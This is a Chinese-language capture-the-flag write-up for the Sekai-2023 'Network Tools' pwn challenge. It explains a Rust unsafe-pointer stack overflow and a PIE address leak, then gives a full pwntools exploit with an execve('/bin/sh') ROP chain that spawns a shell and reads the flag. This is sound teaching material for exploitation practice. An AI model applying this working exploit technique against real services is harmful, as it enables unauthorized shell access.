# Writeup — Network Tools (Sekai-2023, pwn/hard)

## 漏洞：unsafe 裸指標的越界寫

`nettools` 是 Rust 寫的選單程式（ping / traceroute / IP lookup / reverse lookup）。真正的坑在 `ip_lookup()` 呼叫的 `read()` helper：

```rust
fn read(arr: &mut[u8], size: isize) -> isize {
    let arr_ptr = &mut arr[0] as *mut u8;
    unsafe {
        for i in 0..size {                 // size 由呼叫端給
            io::stdin().read_exact(&mut input).expect("msg");
            if input[0] == 0xa { break; }  // 只有換行會提前結束
            *arr_ptr.offset(i) = input[0]; // 裸指標寫，無邊界檢查
        }
        ...
    }
}

fn ip_lookup(){
    let mut input: [u8; 400] = [0; 400]; // 只有 400 bytes 的堆疊緩衝
    let size = read(&mut input, 0x400);  // 卻允許寫 0x400 = 1024 bytes
    ...
}
```

Rust 的安全邊界在 `unsafe` 區塊裡被 `*arr_ptr.offset(i)` 繞過：陣列只有 400 bytes，卻允許寫入 1024 bytes，是典型 stack buffer overflow（越界寫 return address）。限制：遇到 `0xa`（換行）會停；且之後 `str::from_utf8(...).expect()` 要求緩衝前段是合法 UTF-8，因此 payload 前段用可列印字元（`'A'`）並在其後放 null 當作字串結尾。

## 位址洩漏：擊破 PIE

`main()` 開場就送禮：

```rust
println!("Opss! Something is leaked: {:p}", &CHOICE);
```

`CHOICE` 是 `static mut`（在 PIE image 內），印出它的位址即洩漏程式基址。`nettools` 為 64-bit PIE、NX 開啟、無 stack canary（Rust 不插 canary，且此裸指標寫可直接蓋 return address）。由 leak 反推：

```python
exec_base = leak - 0x7a03c
```

## ROP：因為 NX，改用 gadget 串 execve

NX 讓堆疊不可執行，故不注入 shellcode，改用 ROP 呼叫 `execve("/bin/sh", NULL, NULL)`（syscall 號 0x3b）。所需 gadget（相對 `exec_base`）：

```
0xecaa : pop rax ; ret
0xa0ef : pop rdi ; ret
0x9c18 : pop rsi ; ret
0x20bb3: pop rdx ; add byte ptr [rax], al ; ret
0x2b9cb: mov qword ptr [rdi], rax ; ret     # 寫入 gadget
0x25adf: syscall
0x901a : ret                                 # 對齊用的 ret-slide
```

流程：先用「pop rax / pop rdi / mov [rdi], rax」把 `"/bin/sh\x00"` 寫到可寫區（`exec_base+0x7a000`），再寫 8 個 null 到 `+0x7a008` 收尾；接著 `rdi = 指向 "/bin/sh"`、`rsi = 0`、`rdx = 0`、`rax = 0x3b`，最後 `syscall`。

## 組 payload 並打

緩衝 400 bytes + 8 bytes 對齊（null 同時作為 UTF-8 字串終止），再接一段 `ret` slide 修正堆疊對齊，最後接 ROP 鏈：

```python
from pwn import *
p = remote(host, port)

p.recvuntil(b"leaked:")
leak = int(p.recvline(), 16)
exec_base = leak - 0x7a03c
ret = exec_base + 0x901a
rb = lambda x: p64(x + exec_base)

rop  = rb(0xecaa) + rb(0x7a000)              # pop rax ; rax = writable
rop += rb(0x20bb3) + p64(0)                  # pop rdx ; rdx = 0
rop += rb(0xecaa) + b'/bin/sh\x00'           # pop rax ; rax = "/bin/sh"
rop += rb(0xa0ef) + rb(0x7a000)              # pop rdi ; rdi = writable
rop += rb(0x2b9cb)                           # mov [rdi], rax  -> 寫入 /bin/sh
rop += rb(0xecaa) + p64(0)                   # pop rax ; rax = 0
rop += rb(0xa0ef) + rb(0x7a008)              # pop rdi ; rdi = writable+8
rop += rb(0x2b9cb)                           # mov [rdi], rax  -> null 收尾
rop += rb(0xa0ef) + rb(0x7a000)              # pop rdi ; rdi = "/bin/sh"
rop += rb(0x9c18) + p64(0)                   # pop rsi ; rsi = 0
rop += rb(0xecaa) + p64(0x3b)                # pop rax ; rax = 59 (execve)
rop += rb(0x25adf)                           # syscall

p.sendlineafter(b">", b"3")                  # 選 IP lookup
p.sendlineafter(b"Hostname:", b"A"*400 + b"\x00"*8 + p64(ret)*49 + rop)

p.sendline(b"cat challenge/flag.txt")
print(p.recv().decode(errors='ignore').strip())
```

`execve("/bin/sh")` 成功後即得 shell，讀 `/challenge/flag.txt`。

## Flag

`SEKAI{g0_g0_g0_th4t's_h0w_th3_c4rg0_bl0w_4c6cfa1707c99bd5105dd8f16590bece}`
